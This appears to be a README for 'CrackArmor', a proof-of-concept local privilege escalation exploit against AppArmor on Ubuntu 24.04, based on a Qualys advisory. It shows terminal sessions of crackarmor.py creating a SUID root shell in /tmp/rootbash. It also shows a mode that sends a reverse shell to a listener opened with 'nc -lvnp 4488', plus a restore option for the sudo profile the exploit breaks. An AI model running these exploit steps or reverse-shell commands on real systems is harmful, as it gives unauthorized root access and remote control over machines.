# CrackArmor (noob) LPE
Based on: https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt

This is the noob version of the LPE and **NOT use-after-free**. 

It's **not** working on fresh installs of Ubuntu Server 24.04.3 / 24.04.4, even if you rollback to older kernel and AppArmor versions. Don't ask me why..

To my knowledge the AppArmor fix was backported in kernel version 6.8.0-106.

## PoC || GTFO
**Test environment:**
```bash
void@ubnt-dev:~$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="Ubuntu 24.04 LTS"
void@ubnt-dev:~$ uname -r
6.11.0-25-generic
void@ubnt-dev:~$ apparmor_parser -V
AppArmor parser version 4.0.0~beta3
Copyright (C) 1999-2008 Novell Inc.
Copyright 2009-2018 Canonical Ltd.

void@ubnt-dev:~$ id
uid=1000(void) gid=1000(void) groups=1000(void)
```

**Root shell through SUID binary:**
```bash
void@ubnt-dev:~$ python3 crackarmor.py 
--=== CrackArmor LPE ===--
[+] Setting up payload (local)
[+] Building profile
[+] Injecting profile
Password: 
[+] Triggering exploit

========== IMPORTANT ==========
[!] SUID shell: /tmp/rootbash
[!] sudo is broken (AppArmor profile replaced)
[!] Restore with: python3 script.py --restore
===============================

rootbash-5.2# id
uid=1000(void) gid=1000(void) euid=0(root) groups=1000(void)
```

**Reverse shell:**
```bash
## Term 1
void@ubnt-dev:~$ python3 crackarmor.py --mode reverse
--=== CrackArmor LPE ===--
[+] Setting up payload (reverse)
[+] Building profile
[+] Injecting profile
Password: 
[+] Triggering exploit

========== IMPORTANT ==========
[!] Reverse shell sent to: 127.0.0.1:4488
[!] sudo is broken (AppArmor profile replaced)
[!] Restore with: python3 script.py --restore
===============================

## Term 2
void@ubnt-dev:~$ nc -lvnp 4488
Listening on 0.0.0.0 4488
Connection received on 127.0.0.1 42340
bash: cannot set terminal process group (4687): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@ubnt-dev:/var/spool/postfix# id
id
uid=0(root) gid=1000(void) groups=1000(void)
```

**Restore/fix broken AppArmor sudo profile:**
```bash
void@ubnt-dev:~$ sudo ls crackarmor.py 
sudo: PERM_SUDOERS: setresuid(-1, 1, -1): Operation not permitted
sudo: unable to open /etc/sudoers: Operation not permitted
sudo: setresuid() [0, 0, 0] -> [1000, -1, -1]: Operation not permitted
sudo: error initializing audit plugin sudoers_audit

void@ubnt-dev:~$ python3 crackarmor.py --restore
--=== CrackArmor LPE ===--
[+] Restoring sudo AppArmor profile
Password: 

void@ubnt-dev:~$ sudo ls crackarmor.py 
[sudo] password for void: 
crackarmor.py
```
